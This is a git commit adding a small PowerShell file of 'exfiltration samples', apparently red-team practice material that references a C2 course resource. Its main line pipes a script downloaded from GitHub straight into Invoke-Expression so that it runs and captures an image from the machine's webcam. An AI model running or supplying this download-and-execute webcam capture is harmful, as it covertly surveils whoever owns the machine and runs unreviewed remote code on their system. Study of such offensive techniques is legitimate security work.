a7b04639ea18ab22e7a62b80e07c89770e0907fb
unknown <209129@student.pwr.edu.pl>
2020-02-16 00:25:01 +0100

    Camera shot taken from script

---
+++ Exfiltration/ExfiltrationSamples.ps1
@@ -0,0 +1,10 @@
+﻿
+# Save webcam image
+# https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
+iwr https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1 | iex
+
+# Resources
+
+# https://aptmasterclass.com/bsides19/BSides19-C2-sources.html
+# Reload env
+$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
